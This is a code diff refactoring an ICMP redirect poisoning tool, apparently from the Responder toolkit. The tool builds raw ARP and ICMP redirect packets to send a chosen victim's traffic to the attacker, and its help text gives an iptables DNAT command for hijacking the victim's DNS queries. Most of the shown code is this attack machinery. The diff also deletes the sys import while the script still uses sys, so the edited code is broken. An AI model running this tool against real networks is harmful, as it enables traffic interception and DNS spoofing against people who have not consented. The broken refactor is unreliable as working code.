@@ -15,55 +15,47 @@
 #
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
-import sys,socket,struct,optparse,random,pipes
+import socket
+import struct
+import optparse
+import pipes
 from socket import *
 sys.path.append('../')
 from odict import OrderedDict
 from random import randrange
 from time import sleep
 from subprocess import call
-from pipes import quote
+from packets import Packet
 
 parser = optparse.OptionParser(usage='python %prog -I eth0 -i 10.20.30.40 -g 10.20.30.254 -t 10.20.30.48 -r 10.20.40.1',
                                prog=sys.argv[0],
                                )
 parser.add_option('-i','--ip', action="store", help="The ip address to redirect the traffic to. (usually yours)", metavar="10.20.30.40",dest="OURIP")
-
 parser.add_option('-g', '--gateway',action="store", help="The ip address of the original gateway (issue the command 'route -n' to know where is the gateway", metavar="10.20.30.254",dest="OriginalGwAddr")
-
 parser.add_option('-t', '--target',action="store", help="The ip address of the target", metavar="10.20.30.48",dest="VictimIP")
-
 parser.add_option('-r', '--route',action="store", help="The ip address of the destination target, example: DNS server. Must be on another subnet.", metavar="10.20.40.1",dest="ToThisHost")
-
 parser.add_option('-s', '--secondaryroute',action="store", help="The ip address of the destination target, example: Secondary DNS server. Must be on another subnet.", metavar="10.20.40.1",dest="ToThisHost2")
-
 parser.add_option('-I', '--interface',action="store", help="Interface name to use, example: eth0", metavar="eth0",dest="Interface")
-
 parser.add_option('-a', '--alternate',action="store", help="The alternate gateway, set this option if you wish to redirect the victim traffic to another host than yours", metavar="10.20.30.40",dest="AlternateGwAddr")
-
 options, args = parser.parse_args()
 
 if options.OURIP is None:
     print "-i mandatory option is missing.\n"
     parser.print_help()
     exit(-1)
-
-if options.OriginalGwAddr is None:
+elif options.OriginalGwAddr is None:
     print "-g mandatory option is missing, please provide the original gateway address.\n"
     parser.print_help()
     exit(-1)
-
-if options.VictimIP is None:
+elif options.VictimIP is None:
     print "-t mandatory option is missing, please provide a target.\n"
     parser.print_help()
     exit(-1)
-
-if options.Interface is None:
+elif options.Interface is None:
     print "-I mandatory option is missing, please provide your network interface.\n"
     parser.print_help()
     exit(-1)
-
-if options.ToThisHost is None:
+elif options.ToThisHost is None:
     print "-r mandatory option is missing, please provide a destination target.\n"
     parser.print_help()
     exit(-1)
@@ -81,31 +73,16 @@ ToThisHost2 = options.ToThisHost2
 Interface = options.Interface
 
 def Show_Help(ExtraHelpData):
-    help = "\nICMP Redirect Utility 0.1.\nCreated by Laurent Gaffie, please send bugs/comments to laurent.gaffie@gmail.com\n\nThis utility combined with Responder is useful when you're sitting on a Windows based network.\nMost Linux distributions discard by default ICMP Redirects.\n"
-    help+= ExtraHelpData
-    print help
+    print("\nICMP Redirect Utility 0.1.\nCreated by Laurent Gaffie, please send bugs/comments to laurent.gaffie@gmail.com\n\nThis utility combined with Responder is useful when you're sitting on a Windows based network.\nMost Linux distributions discard by default ICMP Redirects.\n")
+    print(ExtraHelpData)
 
 MoreHelp = "Note that if the target is Windows, the poisoning will only last for 10mn, you can re-poison the target by launching this utility again\nIf you wish to respond to the traffic, for example DNS queries your target issues, launch this command as root:\n\niptables -A OUTPUT -p ICMP -j DROP && iptables -t nat -A PREROUTING -p udp --dst %s --dport 53 -j DNAT --to-destination %s:53\n\n"%(ToThisHost,OURIP)
-
-class Packet():
-    fields = OrderedDict([
-        ("data", ""),
-    ])
-    def __init__(self, **kw):
-        self.fields = OrderedDict(self.__class__.fields)
-        for k,v in kw.items():
-            if callable(v):
-                self.fields[k] = v(self.fields[k])
-            else:
-                self.fields[k] = v
-    def __str__(self):
-        return "".join(map(str, self.fields.values()))
 
 def GenCheckSum(data):
     s = 0
     for i in range(0, len(data), 2):
         q = ord(data[i]) + (ord(data[i+1]) << 8)
-        f = s+q
+        f = s + q
         s = (f & 0xffff) + (f >> 16)
     return struct.pack("<H",~s & 0xffff)
 
@@ -117,7 +94,6 @@ class EthARP(Packet):
         ("DstMac", "\xff\xff\xff\xff\xff\xff"),
         ("SrcMac", ""),
         ("Type", "\x08\x06" ), #ARP
-
     ])
 
 class ARPWhoHas(Packet):
@@ -131,7 +107,6 @@ class ARPWhoHas(Packet):
         ("SenderIP",  "\x00\xff\x53\x4d"),
         ("DstMac",    "\x00\x00\x00\x00\x00\x00"),
         ("DstIP",     "\x00\x00\x00\x00"),
-
     ])
 
     def calculate(self):
@@ -146,7 +121,6 @@ class Eth2(Packet):
         ("DstMac", ""),
         ("SrcMac", ""),
         ("Type", "\x08\x00" ), #IP
-
     ])
 
 class IPPacket(Packet):
@@ -163,7 +137,6 @@ class IPPacket(Packet):
         ("SrcIP",   ""),
         ("DestIP",     ""),
         ("Data",       ""),
-
     ])
 
     def calculate(self):
@@ -184,13 +157,10 @@ class ICMPRedir(Packet):
         ("CheckSum",   "\x00\x00"),
         ("GwAddr",     ""),
         ("Data",       ""),
-
     ])
 
     def calculate(self):
-        #Set the values
         self.fields["GwAddr"] = inet_aton(OURIP)
-        # Then CheckSum this packet
         CheckSumCalc =str(self.fields["Type"])+str(self.fields["OpCode"])+str(self.fields["CheckSum"])+str(self.fields["GwAddr"])+str(self.fields["Data"])
         self.fields["CheckSum"] = GenCheckSum(CheckSumCalc)
 
